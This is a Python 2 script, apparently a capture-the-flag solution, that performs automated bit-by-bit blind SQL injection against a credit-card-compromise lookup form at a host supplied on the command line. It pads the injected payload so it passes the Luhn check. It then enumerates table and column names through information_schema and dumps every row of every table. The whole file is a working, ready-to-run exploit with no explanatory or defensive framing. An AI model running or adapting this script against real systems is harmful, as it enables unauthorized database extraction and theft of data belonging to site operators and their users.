#! /usr/bin/python2
import requests
import random
import sys

HOST = sys.argv[1]


def digits_of(number):
    return [int(i) for i in str(number)]


def luhn_checksum(card_number):
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for digit in even_digits:
        total += sum(digits_of(2 * digit))
    return total % 10


def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0


class Result:
    INVALID_CC = 1
    NOT_FOUND = 2
    COMPROMISED = 3


class BlindSql:

    SELECT_COUNT_BITS_SIZE = 4
    SELECT_ASCII_BITS_SIZE = 8

    def __init__(self, select, from_where, select_data_max_length):
        self.SELECT = select
        self.FROM_WHERE = from_where
        self.SELECT_DATA_MAX_LENGTH = select_data_max_length

    def send(self, cc):
        headers = {
            "Host": HOST,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {
            "cc": cc,
        }
        # print cc
        r = requests.post("http://" + HOST, headers=headers, data=data)
        if "We have no information that your CC has been compromised" in r.content:
            return Result.NOT_FOUND
        elif "Your CC has been compromised" in r.content:
            return Result.COMPROMISED
        else:
            return Result.INVALID_CC

    def fix_cc(self, cc):
        candidate = str(cc)
        while True:
            next_digit = str(random.randint(0, 9))
            digits = "".join([str(x) for x in candidate if x.isdigit()])
            if len(digits) % 2 == 0:
                next_digit += "0"
            valid = is_luhn_valid(digits + next_digit)
            if valid:
                return candidate + next_digit
            else:
                candidate += next_digit[0]

    def prepare_cc_query(self, query):
        cc = "1' or (({}) -- ".format(query)
        cc = self.fix_cc(cc)
        return cc

    def blind_read_bits(self, query, bits, limit=-1):
        result_bits = ""
        from_where = self.FROM_WHERE
        if limit > -1:
            from_where += " limit {},{}".format(limit, limit+1)
        for b in range(0, bits):
            q = " {}) & {} <> 0".format(from_where, 2 ** b)
            q = query + q
            cc = self.prepare_cc_query(q)
            r = self.send(cc)
            if r == Result.COMPROMISED:
                result_bits = "1" + result_bits
            else:
                result_bits = "0" + result_bits
        result = int(result_bits, 2)
        return result

    def dump(self):
        data = []
        results = self.blind_read_bits("SELECT COUNT(*)", self.SELECT_COUNT_BITS_SIZE)
        for r in range(0, results):
            length = self.blind_read_bits("SELECT length({})".format(self.SELECT), self.SELECT_DATA_MAX_LENGTH, r)
            entry = ""
            for i in range(1, length + 1):
                ascii_number = self.blind_read_bits("SELECT ascii(substring({}, {}, {}))".format(self.SELECT, i, 1), self.SELECT_ASCII_BITS_SIZE, r)
                entry += str(unichr(ascii_number))
            data.append(entry)
        s = "SELECT " + self.SELECT + " " + self.FROM_WHERE
        return {"select": s, "data": data}


def sql_print(r):
    print r["select"]
    i = 1
    for d in r["data"]:
        print str(i) + ". " + d
        i += 1
    print ""


results = []

q = BlindSql("table_name", "FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'", 4)
r = q.dump()
sql_print(r)

for table in r["data"]:
    q = BlindSql("column_name", "FROM information_schema.columns where table_name = '{}'".format(table), 4)
    r = q.dump()
    sql_print(r)
    all_columns = "concat({})".format(", '::', ".join(r["data"]))
    q = BlindSql(all_columns, "FROM {}".format(table), 16)
    r = q.dump()
    results.append(r)

for r in results:
    sql_print(r)
